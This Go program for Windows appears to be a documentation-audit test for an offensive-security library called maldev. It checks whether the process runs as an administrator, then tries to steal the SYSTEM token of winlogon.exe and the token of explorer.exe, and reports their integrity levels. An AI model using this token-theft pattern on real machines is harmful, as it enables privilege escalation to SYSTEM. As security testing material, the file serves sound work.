//go:build windows

// tokens-impersonation — panorama 7 of the doc-truth audit.
//
// Built strictly from the user-facing markdown:
//   - docs/techniques/tokens/impersonation.md         — ThreadEffectiveTokenOwner
//   - docs/techniques/tokens/token-theft.md           — StealByName, IntegrityLevel
//   - docs/techniques/tokens/privilege-escalation.md  — IsAdmin, IsAdminGroupMember
//
// Tests the read/probe paths first (they tell us *what* the current
// process can do), then attempts a privileged token steal that should
// only succeed for admin. No actual credential abuse — the example
// stops at the OpenProcessToken call to keep the test idempotent.
package main

import (
	"fmt"

	"github.com/oioio-space/maldev/win/impersonate"
	"github.com/oioio-space/maldev/win/privilege"
	"github.com/oioio-space/maldev/win/token"
)

func main() {
	// 1. Who am I right now? privilege.md "Check Current Privileges".
	fmt.Println("=== Identity ===")
	user, domain, err := impersonate.ThreadEffectiveTokenOwner()
	if err != nil {
		fmt.Printf("ThreadEffectiveTokenOwner: %v\n", err)
	} else {
		fmt.Printf("running as: %s\\%s\n", domain, user)
	}
	admin, elevated, err := privilege.IsAdmin()
	if err != nil {
		fmt.Printf("IsAdmin: %v\n", err)
	} else {
		fmt.Printf("admin-group=%v elevated=%v\n", admin, elevated)
	}
	if isMember, err := privilege.IsAdminGroupMember(); err != nil {
		fmt.Printf("IsAdminGroupMember: %v\n", err)
	} else {
		fmt.Printf("IsAdminGroupMember=%v\n", isMember)
	}

	// 2. Token theft: try to steal winlogon's SYSTEM token. Doc claims this
	//    yields IntegrityLevel "System" — only succeeds with admin +
	//    SeDebugPrivilege; lowuser should hit ACCESS_DENIED. (token-theft.md
	//    "Steal by Process Name".)
	fmt.Println("\n=== StealByName winlogon.exe ===")
	tok, err := token.StealByName("winlogon.exe")
	if err != nil {
		fmt.Printf("StealByName: %v\n", err)
	} else {
		defer tok.Close()
		fmt.Printf("StealByName: OK\n")
		if lvl, err := tok.IntegrityLevel(); err != nil {
			fmt.Printf("IntegrityLevel: %v\n", err)
		} else {
			fmt.Printf("IntegrityLevel: %v\n", lvl)
		}
	}

	// 3. Token theft on something less privileged — explorer is owned by
	//    the interactive user (test). Lowuser still can't open it (different
	//    SID), but admin can. Confirms the integrity-vs-owner axis.
	fmt.Println("\n=== StealByName explorer.exe ===")
	if tok, err := token.StealByName("explorer.exe"); err != nil {
		fmt.Printf("StealByName(explorer): %v\n", err)
	} else {
		defer tok.Close()
		fmt.Printf("StealByName(explorer): OK\n")
		if lvl, err := tok.IntegrityLevel(); err != nil {
			fmt.Printf("IntegrityLevel: %v\n", err)
		} else {
			fmt.Printf("IntegrityLevel: %v\n", lvl)
		}
	}
}
